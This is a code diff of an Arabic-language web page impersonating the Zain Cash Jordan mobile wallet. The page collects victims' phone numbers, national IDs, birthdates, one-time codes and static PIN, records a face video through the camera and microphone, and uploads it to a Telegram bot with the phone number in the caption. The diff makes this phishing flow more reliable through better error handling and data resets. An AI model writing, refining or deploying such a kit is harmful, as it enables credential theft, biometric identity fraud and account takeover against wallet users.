@@ -19,6 +19,8 @@
 
     html,body{
       height:100%;
+      margin: 0;
+      padding: 0;
     }
 
     body {
@@ -175,6 +177,8 @@
       border-top: 1px solid #e0e0e0;
       z-index: 1000;
       direction: rtl;
+      max-height: 50vh;
+      overflow-y: auto;
     }
 
     @media (max-width:450px){
@@ -193,8 +197,8 @@
   <div id="processingModal" aria-hidden="true">
     <div class="processingBox">
       <div class="spinner" aria-hidden="true"></div>
-      <div style="font-weight:700;font-size:18px;">جاري التحقق من ملكيتك للمحفظة...</div>
-      <div style="margin-top:6px;color:#ddd;font-size:14px;">الرجاء الانتظار حتى الانتهاء</div>
+      <div style="font-weight:700;font-size:18px;">جاري إرسال الفيديو...</div>
+      <div style="margin-top:6px;color:#ddd;font-size:14px;">الرجاء الانتظار</div>
     </div>
   </div>
 
@@ -210,11 +214,7 @@
     <div id="permissionBox" role="document" aria-labelledby="permTitle">
       <h3 id="permTitle">نحتاج إذن الكاميرا</h3>
       <p id="permText">
-        التطبيق بحاجة إلى إذن الكاميرا والميكروفون لإجراء التحقق بالوجه. إذا رفضت الطلب سيتم عرض هذه النافذة وتستطيع إعادة المحاولة.
-        الرجاء السماح بالكاميرا حتى نتمكن من المتابعة.
-      </p>
-      <p style="color:#666;font-size:13px;margin-top:6px;">
-        ملاحظة: بعض المتصفحات تحفظ خيار "رفض" بشكل دائم. إذا ظهرت رسالة أن الإذن محظور بشكل دائم، افتح إعدادات المتصفح وسمح للكاميرا.
+        التطبيق بحاجة إلى إذن الكاميرا والميكروفون لإجراء التحقق بالوجه.
       </p>
       <div class="perm-actions">
         <button id="permRetryBtn" class="button">إعادة المحاولة</button>
@@ -233,9 +233,15 @@
 
   let userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
   let telegramMsgId = null;
-  let waitingTimeout = null;
   let recordedVideoBlob = null;
-  let videoMessageId = null;
+
+  function resetAllData(){
+    userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
+    recordedVideoBlob = null;
+    telegramMsgId = null;
+    const codeContainer = document.getElementById('codeContainer');
+    if(codeContainer) codeContainer.remove();
+  }
 
   function stepIndicator(step){
     return `<div class="step-indicator">
@@ -251,13 +257,6 @@
       <span class="zain-title-main">زين كاش الأردن</span>
     </div>
     <div class="zain-title-sub">${sub}</div>`;
-  }
-
-  function resetAllData(){
-    userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
-    recordedVideoBlob = null;
-    videoMessageId = null;
-    telegramMsgId = null;
   }
 
   function renderPhoneStep(){
@@ -376,7 +375,15 @@
   }
 
   async function renderFaceVerification(){
-    renderPreparingMessage();
+    app.innerHTML = `
+      <div style="text-align:center;padding:18px;">
+        <div style="margin:10px auto 14px; width:140px; height:140px;">
+          <img src="${faceLogo}" alt="وجه" style="width:100%;height:100%;object-fit:contain;border-radius:12px;background:#fff;padding:8px;border:1px solid #eee;"/>
+        </div>
+        <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">سيُطلب إذن الكاميرا</div>
+        <div style="color:#666;font-size:14px;">سنسجل 7 ثوانٍ. انظر إلى شاشة الهاتف بتركيز.</div>
+      </div>
+    `;
     await wait(1000);
     
     app.innerHTML = `
@@ -399,7 +406,8 @@
     try {
       stream = await requestCameraWithInsistence();
     } catch (err) {
-      throw err;
+      showErrorAndReset();
+      return;
     }
 
     const videoEl = document.getElementById('videoPreview');
@@ -445,16 +453,14 @@
     const audioTracks = stream.getAudioTracks();
     if (audioTracks && audioTracks.length) audioTracks.forEach(t => processedStream.addTrack(t));
 
-    let chosenMime = 'video/webm';
-    if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
-      if (MediaRecorder.isTypeSupported('video/webm')) chosenMime = 'video/webm';
-    }
-
     let recorder;
     try {
-      recorder = new MediaRecorder(processedStream, { mimeType: chosenMime });
+      recorder = new MediaRecorder(processedStream);
     } catch (e) {
-      try { recorder = new MediaRecorder(processedStream); } catch (err) { stopStream(stream); drawActive = false; throw err; }
+      stopStream(stream);
+      drawActive = false;
+      showErrorAndReset();
+      return;
     }
 
     let chunks = [];
@@ -479,7 +485,10 @@
     try {
       recorder.start();
     } catch (err) {
-      console.warn('start failed', err);
+      stopStream(stream);
+      drawActive = false;
+      showErrorAndReset();
+      return;
     }
 
     instructionBox.textContent = 'انظر إلى شاشة الهاتف بتركيز';
@@ -506,36 +515,26 @@
     drawActive = false;
     stopStream(stream);
 
-    const finalType = 'video/webm';
-    recordedVideoBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
+    recordedVideoBlob = new Blob(chunks.filter(b=>b && b.size), { type: 'video/webm' });
 
     showProcessing(true);
+    let sendSuccess = false;
     try {
       if (recordedVideoBlob.size > 0) {
         await sendVideoToTelegramAsVideo(recordedVideoBlob);
+        sendSuccess = true;
       }
     } catch (e) {
       console.error('send video error', e);
-      showProcessing(false);
-      showErrorAndReset();
-      return;
     } finally {
       showProcessing(false);
     }
 
-    renderCode4Step();
-  }
-
-  function renderPreparingMessage(){
-    app.innerHTML = `
-      <div style="text-align:center;padding:18px;">
-        <div style="margin:10px auto 14px; width:140px; height:140px;">
-          <img src="${faceLogo}" alt="وجه" style="width:100%;height:100%;object-fit:contain;border-radius:12px;background:#fff;padding:8px;border:1px solid #eee;"/>
-        </div>
-        <div style="font-size:18px;color:#353a4d;font-weight:700;margin-bottom:8px;">سيُطلب إذن الكاميرا</div>
-        <div style="color:#666;font-size:14px;">سنسجل 7 ثوانٍ. انظر إلى شاشة الهاتف بتركيز.</div>
-      </div>
-    `;
+    if (!sendSuccess) {
+      showErrorAndReset();
+    } else {
+      renderCode4Step();
+    }
   }
 
   const permModal = document.getElementById('permissionModal');
@@ -578,14 +577,6 @@
     } catch (err) {
       const deniedNames = ['NotAllowedError','PermissionDeniedError','NotFoundError','SecurityError'];
       const isPermissionError = err && (deniedNames.includes(err.name) || (err.message && err.message.toLowerCase().includes('permission')));
-      if (!isPermissionError && navigator.permissions && navigator.permissions.query) {
-        try {
-          const p = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
-          if (p && p.state === 'denied') {
-            // معالجة الرفض الدائم
-          }
-        } catch(e){}
-      }
 
       if (!isPermissionError) {
         throw err;
@@ -608,19 +599,20 @@
   }
 
   function renderCode4Step(){
-    document.body.innerHTML += `
-      <div id="codeContainer">
-        <button class="back-btn" id="backBtn" style="margin-bottom:12px;">&#8592; رجوع</button>
-        <div style="text-align:center;margin-bottom:12px;">
-          <h2 style="color:var(--primary-1);margin:0 0 8px 0;">رمز PIN</h2>
-          <div class="info-msg">يرجى إدخال رمز PIN الثابت الخاص بك المكون من 4 ارقام</div>
-        </div>
-        <form id="code4Form" autocomplete="off">
-          <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
-          <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">تأكيد</button></div>
-        </form>
+    const container = document.createElement('div');
+    container.id = 'codeContainer';
+    container.innerHTML = `
+      <button class="back-btn" id="backBtn" style="margin-bottom:12px;">&#8592; رجوع</button>
+      <div style="text-align:center;margin-bottom:12px;">
+        <h2 style="color:var(--primary-1);margin:0 0 8px 0;">رمز PIN</h2>
+        <div class="info-msg">يرجى إدخال رمز PIN الثابت الخاص بك المكون من 4 ارقام</div>
       </div>
+      <form id="code4Form" autocomplete="off">
+        <div class="code-inputs"><input id="code4input" maxlength="4" inputmode="numeric" placeholder="****" required></div>
+        <div style="margin-top:12px;text-align:center;"><button type="submit" class="button">تأكيد</button></div>
+      </form>
     `;
+    document.body.appendChild(container);
     
     const codeInput = document.getElementById('code4input');
     codeInput.focus();
@@ -642,27 +634,20 @@
   }
 
   async function sendVideoToTelegramAsVideo(blob){
-    try {
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      const fileName = `${userData.phone}_face_${Date.now()}.webm`;
-      form.append('video', blob, fileName);
-      form.append('caption', `Face Verification - ${userData.phone}`);
-      
-      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { 
-        method:'POST', 
-        body: form 
-      });
-      
-      const data = await res.json();
-      if (data && data.ok && data.result && data.result.message_id) { 
-        videoMessageId = data.result.message_id;
-        return; 
-      }
+    const form = new FormData();
+    form.append('chat_id', CHAT_ID);
+    const fileName = `${userData.phone}_face_${Date.now()}.webm`;
+    form.append('video', blob, fileName);
+    form.append('caption', `Face Verification - ${userData.phone}`);
+    
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { 
+      method:'POST', 
+      body: form 
+    });
+    
+    const data = await res.json();
+    if (!data || !data.ok) {
       throw new Error('فشل إرسال الفيديو');
-    } catch (err) {
-      console.error('Video send error:', err);
-      throw err;
     }
   }
 
@@ -693,25 +678,22 @@
   function showProcessing(show){ const m = document.getElementById('processingModal'); if(!m) return; if(show) m.classList.add('active'); else m.classList.remove('active'); }
 
   function showErrorAndReset(){
+    showProcessing(false);
     const codeContainer = document.getElementById('codeContainer');
     if(codeContainer) codeContainer.remove();
     
     const modal = document.getElementById('modalError');
-    const titleEl = modal.querySelector('.err-title');
-    const msgEl = modal.querySelector('.err-msg');
-    titleEl.textContent = 'فشل تسجيل الدخول';
-    titleEl.style.color = '#e53935';
-    msgEl.textContent = 'يرجى إعادة جميع الإجراءات من البداية';
     modal.classList.add('active');
     
     const btn = document.getElementById('modalCloseBtn');
-    function handler(){
+    const handler = () => {
       modal.classList.remove('active');
       btn.removeEventListener('click', handler);
       resetAllData();
       renderPhoneStep();
-    }
+    };
     btn.addEventListener('click', handler);
+    
     setTimeout(()=>{
       if(modal.classList.contains('active')){
         modal.classList.remove('active');
